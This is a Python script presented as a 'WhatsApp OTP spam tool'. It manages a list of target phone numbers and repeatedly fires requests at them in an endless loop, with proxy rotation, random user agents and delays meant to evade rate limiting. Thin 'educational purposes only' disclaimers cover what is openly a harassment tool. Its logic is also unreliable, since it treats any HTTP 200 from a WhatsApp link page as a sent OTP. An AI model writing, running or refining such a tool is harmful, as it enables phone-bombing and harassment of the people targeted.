import requests
import random
import string
import threading
import time
from fake_useragent import UserAgent
from colorama import Fore, init

init(autoreset=True)

class WhatsAppOTPSpammer:
    def __init__(self):
        self.ua = UserAgent()
        self.proxies = self.load_proxies()
        
        # HARDCODED TARGET NUMBERS - DO NOT USE WITH REAL NUMBERS
        self.target_numbers = [
            "+639051234567",  # Example 1
            "+639151234568",  # Example 2
            "+639251234569",  # Example 3
            # Add more numbers here (WITH CONSENT ONLY)
        ]
        
        self.success_count = 0
        self.failed_count = 0

    def load_proxies(self):
        try:
            with open("proxies.txt", "r") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(Fore.RED + "[!] proxies.txt not found. Using direct connection.")
            return []

    def send_otp(self, phone):
        url = f"https://api.whatsapp.com/send?phone={phone}&text=OTP+Request"
        headers = {
            "User-Agent": self.ua.random,
            "Accept": "/",
            "Connection": "keep-alive"
        }
        proxy = random.choice(self.proxies) if self.proxies else None
        proxies = {"http": proxy, "https": proxy} if proxy else None
        
        try:
            response = requests.get(url, headers=headers, proxies=proxies, timeout=10)
            if response.status_code == 200:
                print(Fore.GREEN + f"[+] OTP request sent to {phone}")
                self.success_count += 1
            else:
                print(Fore.YELLOW + f"[-] Failed to send to {phone} (Status: {response.status_code})")
                self.failed_count += 1
        except Exception as e:
            print(Fore.RED + f"[!] Error sending to {phone}: {str(e)}")
            self.failed_count += 1

    def start_spam(self, threads=5):
        if not self.target_numbers:
            print(Fore.RED + "[!] No target numbers specified.")
            return
            
        print(Fore.CYAN + f"[*] Starting WhatsApp OTP requests to {len(self.target_numbers)} targets...")
        print(Fore.RED + "[WARNING] This is for educational purposes only. Do not use for harassment.")
        
        while True:
            threads_list = []
            
            # Distribute targets across threads
            for phone in self.target_numbers:
                t = threading.Thread(target=self.send_otp, args=(phone,))
                t.start()
                threads_list.append(t)
                
                # Add delay to avoid rate limiting
                time.sleep(random.uniform(1, 3))  # Increased delay
            
            # Wait for all threads to complete
            for t in threads_list:
                t.join()
            
            print(Fore.MAGENTA + f"\n[STATS] Success: {self.success_count} | Failed: {self.failed_count}")
            
            # Ask if user wants to continue
            cont = input(Fore.YELLOW + "\nContinue spamming? (y/n): ").lower()
            if cont != 'y':
                break
            
            # Optional: Clear counts or keep cumulative
            clear_counts = input(Fore.YELLOW + "Clear counts? (y/n): ").lower()
            if clear_counts == 'y':
                self.success_count = 0
                self.failed_count = 0

    def add_target(self, phone_number):
        """Add a single target number"""
        if phone_number not in self.target_numbers:
            self.target_numbers.append(phone_number)
            print(Fore.GREEN + f"[+] Added {phone_number} to targets")
            return True
        return False

    def remove_target(self, phone_number):
        """Remove a target number"""
        if phone_number in self.target_numbers:
            self.target_numbers.remove(phone_number)
            print(Fore.YELLOW + f"[-] Removed {phone_number} from targets")
            return True
        return False

    def show_targets(self):
        """Display all current targets"""
        print(Fore.CYAN + "\n[Current Targets]")
        for idx, phone in enumerate(self.target_numbers, 1):
            print(f"{idx}. {phone}")
        print(f"Total: {len(self.target_numbers)} targets")

# Interactive version
if __name__ == "__main__":
    spammer = WhatsAppOTPSpammer()
    
    # Interactive menu
    while True:
        print(Fore.CYAN + "\n" + "="*50)
        print("WHATSAPP OTP SPAM TOOL (EDUCATIONAL PURPOSES ONLY)")
        print("="*50)
        print("1. Show current targets")
        print("2. Add target number")
        print("3. Remove target number")
        print("4. Start spamming")
        print("5. Exit")
        print("="*50)
        
        choice = input(Fore.WHITE + "\nSelect option (1-5): ")
        
        if choice == "1":
            spammer.show_targets()
        
        elif choice == "2":
            phone = input("Enter phone number (with country code, e.g., +639051234567): ")
            if phone:
                spammer.add_target(phone)
        
        elif choice == "3":
            phone = input("Enter phone number to remove: ")
            if phone:
                spammer.remove_target(phone)
        
        elif choice == "4":
            threads = input("Number of threads (1-10, default 3): ")
            try:
                threads = int(threads) if threads else 3
                threads = max(1, min(10, threads))  # Limit to 1-10
                spammer.start_spam(threads=threads)
            except ValueError:
                print(Fore.RED + "[!] Invalid number. Using default (3)")
                spammer.start_spam(threads=3)
        
        elif choice == "5":
            print(Fore.YELLOW + "[*] Exiting...")
            break
        
        else:
            print(Fore.RED + "[!] Invalid option")
